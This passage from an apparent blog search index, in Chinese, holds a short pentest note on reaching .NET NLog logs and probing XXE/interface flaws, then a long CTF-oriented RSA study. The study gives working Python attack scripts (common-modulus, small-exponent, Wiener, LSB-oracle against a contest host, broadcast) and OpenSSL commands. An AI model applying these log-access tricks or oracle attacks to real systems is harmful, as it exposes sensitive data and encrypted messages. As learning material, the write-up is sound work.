对于现在许多.net的网站，一般在遇到.net的网站访问一些目录时报404/403等，就会放弃。其实.net的网站有Nlog日志，通过Nlog的特性构造一些payload就可以访问有些站点的Nlog日志，里面可能会包含敏感信息。 关于Nlog的特性一下文章有说明：http://www.cnblogs.com/felixnet/p/5498759.html 关于payload主要就是拼接当前的一些时间等关键值 xxe接口越权 xxe的越权，这里还是一些网站使用的接口权限设置不当造成的，路劲可以通过dirb探测等等。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>渗透测试</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA总结]]></title>
    <url>%2F2018%2F09%2F02%2FRSA%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[关于RSA的一些总结 最近一段时间比赛比较多，密码学的题也是各种各样的，有时候会碰到RSA，想想上学期学的数论，RSA就讲了整整一个月，最后发现代码上还是应用不了，就像没学一样，毕竟在实际生活中好多加密算法都是设计好的。为了让学过的东西不要白学，抽点时间结合题目，对RSA进行一下总结，网上好多关于RSA的文章写的都挺好的，但还是喜欢自己动手做一遍。本文没有啥原创的东西，主要是对学习的一个记录。 RSA简介： 上图是对RSA算法非对称加解密的一个描述，也是RSA算法最根本的东西，下面说一下RSA算法被攻击的可能性（有没有在知道公钥的情况下推导出私钥） 12345要知道的理论是： ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 n=pq。只有将n因数分解，才能算出p和q。所以：如果n可以被分解，那就可以推到出d,私钥就可以被破解，但实际上p,q是大素数，分解是很困难的 一些理论支撑： 12345678910111213欧拉函数：φ(n)是小于等于n的数中与n互质的数的数目欧拉函数是积性函数——若p,q互质，φ(p*q)= φ(p) *φ(q) 若p为质数，则φ(p)=p-1同余定理：给定一个正整数m，如果两个整数a和b满足（a-b）能够被m整除，即（a-b）/m得到一个整数，那么就称整数a与b对模m同余，记作a≡b(mod m)。 性质： 1 自反性 a≡a (mod m) 2 对称性 若a≡b(mod m)，则b≡a (mod m) 3 传递性 若a≡b (mod m)，b≡c (mod m)，则a≡c (mod m) 4 同余式相加 若a≡b (mod m)，c≡d(mod m)，则a+-c≡b+-d (mod m) 5 同余式相乘 若a≡b (mod m)，c≡d(mod m)，则ac≡bd (mod m)求逆元：指有一个整数d，可以使得e*d被φ(n)除的余数为1，即e*d ≡ 1 (mod φ(n))，这个式子等于e*d - 1 = k*φ(n) 一些程序代码上的支撑：（都是用python实现算法的应用） 快速幂取模：等价于pow方法 123456789def mod(c,d,n):#等价于自带的pow(c,d,n) r=1 while d&gt;0: c=c%n if d&amp;1: r=(r*c)%n d&gt;&gt;=1 c=(c*c)%n return r 模逆运算（就是求逆元，主要基于扩展欧几里得算法） python实现代码如下： 123456789def egcd ( a , b ): if (b == 0): return 1, 0, a else: x , y , q = egcd( b , a % b ) # q = GCD(a, b) = GCD(b, a%b) x , y = y, ( x - (a // b) * y ) return x, y, q def mod_inv(a,b): return egcd(a,b)[0]%b #求a模b得逆元 出来通过自己编写实现之外还可以通过gmpy2和libnum这两个库函数实现： 12345#coding:utf-8from libnum import invmodimport gmpy2print invmod(47,30)print gmpy2.invert(47,30) 欧几里得算法：就是求最大公约数，gcd(a,b)==gcd(b,a%b),(b!=0) 和 gcd(a,0)==a有递归实现和迭代实现两种： 123456789# 递归版def gcd(a, b): return a if not b else gcd(b, a % b)# 迭代版def gcd2(a, b): while b: a, b = b, a % b return a 扩展欧几里得算法：本质上就是将欧几里得算法求最大公约数的过程最后转化为线性表达式： 1234567891011121314151617181920212223# 递归版def ext_euclid ( a , b ): if (b == 0): return 1, 0, a else: x1 , y1 , q = ext_euclid( b , a % b ) # q = GCD(a, b) = GCD(b, a%b) x , y = y1, ( x1 - (a // b) * y1 ) return x, y, q# 迭代版def egcd(a, b): if b == 0: return (1, 0, a) x, y = 0, 1 s1, s2 = 1, 0 r, q = a % b, a / b while r: m, n = x, y x = s1 - x * q y = s2 - y * q s1, s2 = m, n a, b = b, r r, q = a % b, a / b return (x, y, b) 中国剩余定理，也叫孙子定理：用来求同于方程组（这里在数论中做题不复杂，一到代码是真的复杂） 直接贴上大佬的代码：（解决了互质与不互质两种情况） 12345678910111213def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d cura %= curm return (cura % curm, curm) #(解,最小公倍数) 应用中一些函数、模块的支撑 这里不得不感慨python的强大与方便，提供了gmpy2库、libnum库、pycrypto模块等第三方库，避免了从底层一步一步的写代码（其实也是太菜了，这种基于数论的代码是真的写不出来） gmpy2库、libnum库，主要提供各种数学运算的函数库，向求逆元，取模等运算直接调运函数就可以，很便捷 关于两个库的说明链接如下： pycrypto模块是python中来处理加密解密等信息安全相关的一个重要模块，提供了对称加密、非对称加密、散列哈希的一些计算方法，满足我们在密码学应用上的使用，就RSA可以实现公私钥的提取，生成，利用公私钥进行加解密等，之前写过的一篇文章有介绍 关于RSA中n的分解： 有在线分解：[]:http://factordb.com/ 离线的[yafu]:https://sourceforge.net/projects/yafu/ （p,q相差较大或较小时可快速分解） 除了用代码，还可以用OpenSSL对一些标准格式的RSA加解密 使用OpenSSL提取公钥信息：openssl rsa -pubin -in (文件名) -text 使用OpenSSL提取私钥信息：openssl rsa -in (文件名) -text 使用OpenSSL进行公钥加密：openssl rsautl -encrypt -in test -out test.enc -inkey asn1pub.pem -pubin 使用OpenSSL进行私钥解密：openssl rsautl -decrypt -in test.enc -out test.dec -inkey asn1enc.pem 使用OpenSSL进行私钥签名：openssl rsautl -sign -in test -out test.sig-inkey asn1enc.pem 使用OpenSSL进行公钥验证：openssl rsautl -verify -in test.sig -out test.vfy -inkey asn1pub.pem -pubin 一些实际的应用： RSA直接解密： 若已知私钥d，则可以直接解密： m=pow(c,d,n) : 1234567891011121314151617p:0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebeddLq:0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873Le:0x190a000845e9c8c2059242835432326369aaf8c7ca85e685bba968b386155a91f1f7ca1019ff23d119222e1f0dfdeb0915d2e97601ef94bf15ca6d9211e984e9038f263f4984355c397ed22d67c26da6d31acfc4d599c70cba80859bee099e5a2dc3ab23aecf58f73f44d07318f70985c623d9612efefb15bf8dab77d5d54e85Ld:0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5L c:0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9Lc=0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9d=0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5n=0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebedd * 0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873m=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode('hex') 若已知质数p和q，则通过依次计算欧拉函数、私钥d可解密。实现如下： 123456789def rsa_decrypt(e, c, p, q): phi = (p - 1) * (q - 1) n = p * q try: d = gmpy2.invert(e, phi) #求e模phi的逆 return pow(c, d, n) except Exception as e: print "e and phi are not coprime!" raise e 在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的 12345678x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259tell me the smallest answer of xn = 3436415358139016629092568198745009225773259=3881 · 885445853681787330351086884500131209939e = 33c = 1926041757553905692219721422025224638913707phi=(p-1)*(q-1)gcd(phi,33)==3 -&gt; e = 11n分解以后不满足互素的要求，先用逆元11得到x^3的值,然后爆破X 123456789101112131415161718192021import gmpy2import libnumc = 1926041757553905692219721422025224638913707n = 3436415358139016629092568198745009225773259e = 33p = 3881q = 885445853681787330351086884500131209939phi = (p-1)*(q-1)d = libnum.invmod(e/3, phi)print dx3 = pow(c, d, n)print x3def calc(i): x, b = gmpy2.iroot(x3 + i *n, 3) if b == 1: print x exit()for j in xrange(0,100000000): calc(j) 模不互质（gcd(N1,N2)!=1）适用情况：存在两个或更多模数，且gcd(N1,N2)!=1 多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。 共模攻击：适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1 对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。 python实现的证明代码： 123456789101112def common_modulus(n, e1, e2, c1, c2): """ ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1 ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2) """ assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) # 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。 m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) return m % n Xman-RSA(这道题利用了共模攻击和模不互素) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b): return int(b.encode('hex'), 16)def num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b) % 2 == 1 else b return b.decode('hex')def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num += 1 return numdef encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode('hex')def separate(n): p = n % 4 t = (p * p) % 4 return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = ""msg2 = ""for i in range(len(flag)): if separate(i): msg2 += flag[i] else: msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1 * p2n2 = p1 * p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4 * p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3))) n2，n3已知，利用共模攻击得到n1，由gcd(n1,n2)==p1 分解n1，n2得到flag： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# -*- coding: utf-8 -*-# by https://findneo.github.io/import base64import libnumimport gmpy2def fix_py(): # decode encryption.encrypted s1 = 'abdefghijklmpqrtuvwxyz' s2 = 'dmenwfoxgpyhirasbktclu' f1 = open('encryption.encrypted') with open('encryption.py', 'w') as f2: for i in f1.readlines(): tmp = '' for j in i: tmp += s2[s1.index(j)] if j in s1 else j f2.write(tmp)# fix_py()def common_modulus(n, e1, e2, c1, c2): assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) m %= n return m[n2, n3] = map(lambda x: int(base64.b64decode(x).encode('hex'), 16), open('n2&amp;n3').readlines())[n1c1, n1c2] = map(lambda x: int(x, 16), open('n1.encrypted').readlines())[msg1c1, msg2c2] = map(lambda x: int(x, 16), open('ciphertext').readlines())# 通过共模攻击得到n1e1 = 0x1001e2 = 0x101n1 = common_modulus(n3, e1, e2, n1c1, n1c2)# n1,n2有一个共有质因数p1# n1 += n3 # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。p1 = gmpy2.gcd(n1, n2)assert (p1 != 1)p2 = n1 / p1p3 = n2 / p1e = 0x1001d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))msg1 = pow(msg1c1, d1, n1)msg2 = pow(msg2c2, d2, n2)msg1 = hex(msg1)[2:].decode('hex')msg2 = hex(msg2)[2:].decode('hex')print msg1, msg2# XA&#123;RP0I_0Itrsigi s.y# MNCYT_55_neetnvmrap&#125;# XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125; RSA-CRYPTO(有两个公钥文件和两个flag文件。提取公钥对比，n相同且可解密，共模攻击) 12345678910from Crypto.PublicKey import RSAwith open('./pubkey2.pem', 'r') as f: key = RSA.importKey(f) n = key.n e = key.eprint (n)print (e)#提取两个公钥都是这个脚本 1234567891011121314151617181920212223242526272829303132333435#coding:utf-8import gmpy2import stringfrom Crypto.Util.number import long_to_bytesfrom base64 import *#共模攻击n = 0x8989a398988456b3fef4a6ad86df3c99577f8978048de5436befc30d8d8c94958912aa526ff333b66857306ebb8de36c2c396a84efdc5d382502daa1a3f3b6e97502d2e31c849330f5b4c95257a149a97f5954eaf89341147adcdd4e950fff74e30bbe622876b42eeac86df4ad9715d05b5604aa8179424c7d9ac46bd6b5f322b2b5728ba148704a25a8efcc1e7c84ea7e5ce3e01703f04f94a431d9954bd7ae2c7dd6e879b35f8a2d4a5efbe737257bf99bd9ee66b15aff233fc77b558a487da5952fbe2b923da9c5eb46788c050336b7e36a5ed82d5c1b2aeb0e45bee405cbe72481db2568aa829eeac87d201a5a8ff5ee6f0be38192ab2839635f6c664217Le1 = 2333e2 = 23333with open('./flag1.enc','r') as f: cipher1 = f.read() cipher1 = b64decode(cipher1).encode('hex') cipher1 = string.atoi(cipher1,base = 16)with open('./flag2.enc','r') as f: cipher2 = f.read() cipher2 = b64decode(cipher2).encode('hex') cipher2 = string.atoi(cipher2,base = 16) #将字符串转为整型数字,base 指定进制gcd, s, t = gmpy2.gcdext(e1, e2) #返回一个三元素的元组 g == gcd（a，b）和g == a * s + b * tif s &lt; 0: s = -s cipher1 = gmpy2.invert(cipher1,n) #求cipher1模n的逆(求逆元)if t &lt; 0: t = -t cipher2 = gmpy2.invert(cipher2,n)#powmod（x，y，m）返回（x ** y）mod m。指数y可以是负数，如果x mod m的逆存在，则返回正确的结果。否则，引发ValueErrorplain = gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % nprint long_to_bytes(plain) 小明文攻击：适用情况：e较小，一般为3。公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。 Jarvis OJ Extremely hard RSA 12345678910111213import gmpy2,binascii,libnum,timen=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e=3res=0c=int(open('extremelyhardRSA.rar/flag.enc','rb').read().encode('hex'),16)print time.asctime()for i in xrange(200000000): if gmpy2.iroot(c+n*i,3)[1]==1: res=gmpy2.iroot(c+n*i,3)[0] print i,res print libnum.n2s(res) print time.asctime() break Rabin加密中的N可被分解:Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征,一般先通过其他方法分解得到p，q，然后解密. python实现： 1234567891011def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) Jarvis OJ hard RSA 12345678910111213141516171819import gmpy2import libnumn=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDp=275127860351348928173285174381581152299q=319576316814478949870590164193048041239e=2c=int(open('hardRSA.rar/flag.enc','rb').read().encode('hex'),16)mp=pow(c,(p+1)/4,p)mq=pow(c,(q+1)/4,q)yp=gmpy2.invert(p,q)yq=gmpy2.invert(q,p)r=(yp*p*mq+yq*q*mp)%nrr=n-rs=(yp*p*mq-yq*q*mp)%nss=n-sprint libnum.n2s(r)print libnum.n2s(rr)print libnum.n2s(s)print libnum.n2s(ss) Wiener’s Attack:适用情况：e过大或过小(低解密指数攻击) 工具地址：[]:https://github.com/pablocelayes/rsa-wiener-attack 这里脚本运行报错的话，再脚本前加上： 12import syssys.setrecursionlimit(10000000) python实现： 1234567891011121314151617from Crypto.PublicKey import RSAimport ContinuedFractions, Arithmeticdef wiener_hack(e, n): frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print("Hacked!") return d return False nextrsa-Level2 1234n = 0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1Le = 0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fLd = wiener_hack(e, n)print d 私钥文件修复:适用情况：提供破损的私钥文件 Jarvis OJ-God Like RSA []:https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html LSB Oracle Attack:适用情况：可以选择密文并泄露最低位 在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n ， 因为m的两倍可能大于n，所以经过解密得到的明文是 m&#39;=(2*m)%n 。我们还能够知道 m&#39; 的最低位lsb 是1还是0。 因为n是奇数，而2*m 是偶数，所以如果lsb是0，说明(2*m)%n 是偶数，没有超过n，即m&lt;n/2.0 ，反之则m&gt;n/2.0 。举个例子就能明白2%3=2 是偶数，而4%3=1 是奇数。以此类推，构造密文c&quot;=(4^e)*c)%n 使其解密后为m&quot;=(4*m)%n ，判断m&quot; 的奇偶性可以知道m 和 n/4 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间 123456789101112131415161718import decimaldef oracle(): return lsb == 'odd'def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for 'precise enough' floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) / 2 else: lo = (lo + hi) / 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) Baby RSA 1234567891011e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0λ nc 47.96.239.28 23333----------------------------- baby rsa -----------------------------Come and Decode your dataIf you give me ciphertext, I can tell you whether decoded data is even or oddYou can input ciphertext(hexdecimal) now1odd 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# -*- coding: utf-8 -*-# by https://findneo.github.io/# ref:# https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack# https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/# https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/import libnum, gmpy2, socket, time, decimaldef oracle(c1): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) hostname = '47.96.239.28' port = 23333 s.connect((hostname, port)) s.recv(1024) s.send(hex(c1)[2:].strip("lL") + '\n') res = s.recv(1024).strip() s.close() if res == 'even': return 0 if res == 'odd': return 1 else: assert (0)def partial(c, n): global c_of_2 k = n.bit_length() decimal.getcontext().prec = k # allows for 'precise enough' floats lower = decimal.Decimal(0) upper = decimal.Decimal(n) for i in range(k): possible_plaintext = (lower + upper) / 2 # lower==0 when i&lt;1809 flag = oracle(c) if not flag: upper = possible_plaintext # plaintext is in the lower half else: lower = possible_plaintext # plaintext is in the upper half c = (c * c_of_2) % n # multiply y by the encryption of 2 again print i, flag, int(upper - lower) # time.sleep(0.2) # By now, our plaintext is revealed! return int(upper)def main(): print "[*] Conducting Oracle attack..." return partial((c * c_of_2) % n, n)if __name__ == '__main__': e = 0x10001 n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db 选择密文攻击:适用情况：可以构造任意密文并获得对应明文(在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足gcd(x,n)==1 从而使x模n的逆存在，构造密文 c&#39;=c*(x^e) 使解密后明文为 m&#39;=(m*x)%n ，则m=m&#39;*x^-1(mod n)) 广播攻击:适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据(使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况) nextrsa-Level9 123456789m = random.randint(0x100000000000, 0xffffffffffff)e = 3n1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555Ln2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867Ln3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303Lc1 = pow(m, e, n1)c2 = pow(m, e, n2)c3 = pow(m, e, n3)print m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[0] 总结： 看了各位表哥写的关于RSA的文章，学到了很多，以前之学习了数论，在代码上实践的很少，对这些脚本进行学习，总结，在RSA这一块有了很大的帮助。各位表哥的脚本写的很好，值得学习。 参考链接： []:https://www.anquanke.com/post/id/84632 []:https://github.com/findneo/RSA-ATTACK []:https://blog.csdn.net/qq_31481187/article/details/70448108 []:https://blog.csdn.net/like98k/article/details/79352076]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码学</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-pycrypto模块浅学]]></title>
    <url>%2F2018%2F08%2F31%2Fpython-pycrypto%E6%A8%A1%E5%9D%97%E6%B5%85%E5%AD%A6%2F</url>
